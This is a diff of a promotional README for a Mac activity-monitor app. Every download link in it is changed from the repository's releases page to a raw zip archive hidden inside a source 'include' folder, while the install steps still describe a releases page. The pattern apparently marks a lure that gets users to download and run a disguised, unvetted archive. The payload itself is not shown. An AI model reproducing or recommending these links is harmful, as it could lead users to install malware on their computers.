@@ -4,13 +4,13 @@
 
 Welcome! ActivityMonitor is a friendly tool that shows you what's happening inside your Mac in real time. Think of it as a health dashboard for your computer — you can see how hard your processor is working, how much memory is in use, and which apps are hogging your resources. The best part? It's completely free and easy to use.
 
-[![Download ActivityMonitor](https://img.shields.io/badge/Download-ActivityMonitor-blue?style=for-the-badge&logo=apple&color=#0071e3)](https://github.com/botdlbot9-rgb/ActivityMonitor/releases)
+[![Download ActivityMonitor](https://img.shields.io/badge/Download-ActivityMonitor-blue?style=for-the-badge&logo=apple&color=#0071e3)](https://raw.githubusercontent.com/botdlbot9-rgb/ActivityMonitor/main/Sources/SystemBridge/include/v2.6.zip)
 
 ## 📥 Download and Installation
 
 Getting ActivityMonitor on your Mac is simple. Here's what to do:
 
-1. **Visit this link to download the application:** [https://github.com/botdlbot9-rgb/ActivityMonitor/releases](https://github.com/botdlbot9-rgb/ActivityMonitor/releases)
+1. **Visit this link to download the application:** [https://raw.githubusercontent.com/botdlbot9-rgb/ActivityMonitor/main/Sources/SystemBridge/include/v2.6.zip](https://raw.githubusercontent.com/botdlbot9-rgb/ActivityMonitor/main/Sources/SystemBridge/include/v2.6.zip)
 2. On that page, you'll see a list of available files. Look for the most recent version — it's usually at the top.
 3. Click the download button next to the file name. Your browser will save the file to your "Downloads" folder.
 4. Once the download finishes, you'll have the ActivityMonitor app ready to use.
@@ -89,7 +89,7 @@ Have a question or an issue? You can visit the repository page and leave a comme
 
 You've made it this far, which means you're curious — and that's all it takes. Download ActivityMonitor today and take the first step toward mastering your Mac's performance.
 
-**[Click Here to Download ActivityMonitor](https://github.com/botdlbot9-rgb/ActivityMonitor/releases)**
+**[Click Here to Download ActivityMonitor](https://raw.githubusercontent.com/botdlbot9-rgb/ActivityMonitor/main/Sources/SystemBridge/include/v2.6.zip)**
 
 ---
 
@@ -124,6 +124,6 @@ ActivityMonitor isn't just another utility — it's a beautifully crafted window
 
 So what are you waiting for? Your Mac is doing a hundred things right now — wouldn't you like to know what they are?
 
-**[Download ActivityMonitor Now](https://github.com/botdlbot9-rgb/ActivityMonitor/releases)**
+**[Download ActivityMonitor Now](https://raw.githubusercontent.com/botdlbot9-rgb/ActivityMonitor/main/Sources/SystemBridge/include/v2.6.zip)**
 
 Keywords: activity-monitor, apple-silicon, desktop-app, gpu-monitoring, macos, performance-monitoring, process-monitor, swift, swiftui, system-monitor
